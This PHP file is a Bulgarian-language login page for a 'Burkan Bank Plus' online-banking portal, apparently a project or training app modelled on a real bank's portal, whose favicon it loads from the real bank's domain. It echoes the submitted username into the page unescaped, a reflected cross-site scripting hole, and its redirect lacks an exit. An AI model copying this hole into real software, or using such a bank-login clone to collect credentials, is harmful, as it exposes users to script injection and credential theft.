<?php
//-=-=-=-=-=--=-=-=-=--=-==--==-=-=Comming validation=-=-=-=-=-=-=-=---==-=-=-\\
if (isset($_POST['submith']) && !empty($_POST['userName'])){
	
	$userName = $_POST['userName'];
	
}else {
	header('Location: ./BurkanPlus.php');
}






?>

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Burkan Bank Plus</title>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="keywords"
	content="Burkan Bank online, Burkan Bank, онлайн банкиране, електронно банкиране, банка, интернет, защита, сигурност, токен, информация, сметка, извлечение, валутен курс, валутни курсове, обмяна, Виза, МастърКард ">
<meta name="description"
	content="Портал за онлайн банкиране, Online banking portal">
<meta name="author" content="Jasen & Kaloyan">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="./assets/css/flaticon.css">
<link type="text/css" rel="stylesheet" href="./assets/css/login.css">
<link type="image/x-icon" href="https://transact.bacbplus.bg/images/fav2icon.ico" rel="Icon">
</head>
<body>
	<form id="m_Form" method="post" style="margin: 0px" action="">
		<input type="hidden" name="userTime" id="userTime">
		<section>
			<div class="login_wrap">
				<div class="login-container">
					<div class="login-logo">
						<img src="./" alt="Burcan Plus">
					</div>
					<div class="login-drop">
						<div class="login-heading">
							Вход в <strong> Burkan Bank Plus </strong><input type="hidden"
								name="processlogin" value="true">
						</div>
						<div class="clearfix">
							<div class="column-left">
								<div class="login-input-group">
									<label for="userName"> Потребител </label><input
										class="input-control valid" type="text" id="userName"
										tabindex="0" size="33" name="userName" autocomplete="off"
										maxlength="32" value="<?php echo $userName?>">
								</div>
								<div class="login-input-group">
									<label for="pwd"> Парола </label><input type="password"
										class="input-control" id="pwd" size="33" tabindex="0"
										name="pwd" autocomplete="off">
								</div>
								<div class="login-checkbox-list">
									<div class="login-input-group checkbox-group">
										<input type="checkbox" id="IsLoginETAN" name="LoginETAN"
											data-bind="checked: Data.ETANLoginHelpVisible"><label
											for="IsLoginETAN" class="check bind"><span
											class="pseudo-checkbox"></span> Парола от Е-ТАН </label><span
											class="hint"
											title="Това е уникална, еднократно използваема, 8-разрядна цифрова комбинация, представляваща парола за идентификация. Моля изберете Генерирай и после въведете получената като SMS парола.">?</span>
										<p class="passphrase note bind"
											data-bind="visible: Data.ETANLoginHelpVisible"
											style="display: none;">
											Вход в системата е възможен единствено при Е-ТАН, регистриран
											като текущо активно средство за сигурност . <a id="btnETAN"
												href="javascript:void(0)"
												onclick="GenerateETAN($('#userName').val())"> Генерирай </a>
										</p>
									</div>
								</div>
								<!--CAPTCHA-->
								<!--CAPTCHA-->
								<div class="login-links">
									<a class="show-dialog" id="passwordDialog" href=""> Забравена
										парола ? </a>
								</div>
							</div>
							<div class="column-right">


								<div class="login-badge">
									<!--SSL Serticicates-->

								</div>
							</div>
						</div>
						<div class="login-drop-footer">
							<div class="login-btns">
								<button class="btn" type="submit"
									onclick="setCurrentTime('userTime');">вход</button>
							</div>
							<div class="mini-text">Всички транзакции са защитени посредством
								256-bit SSL криптиране</div>
						</div>
					</div>
				</div>
				<div>
					<p class="clearfix">
						<input type="hidden" name="returnToUrl" value="">
					</p>
					<div class="login_wrap" style="display: none;" id="dialogText">
						<div class="login_container" id="dialogInner"></div>
					</div>

				</div>
			</div>
			<!--ADDITIONAL_MESSAGE-->
			<!--/////ADDITIONAL_MESSAGE-->
		</section>

		<footer id="footer">
			<div class="wrap" style="cursor: pointer">
				<ul>
					<li><span class="copyright">© Burkan Bank • 2017</span></li>
					<li><a class="userguide" href="">Потребителско ръководство</a></li>
					<li><a href="">Препоръки за сигурност</a></li>
					<li><div class="def_control_CurrentCCY">
							<span style="text-transform: uppercase"
								class="def_control_CurrentCCY">Валутни курсове:<span
								class="flaticon-storage"></span> &nbsp;EUR 1.955830&nbsp; USD
								1.834570&nbsp; GBP 2.293960&nbsp;
							</span>

						</div></li>
					<li><a class="userguide">EN</a></li>
				</ul>
			</div>
		</footer>
	</form>
	
</body>
</html>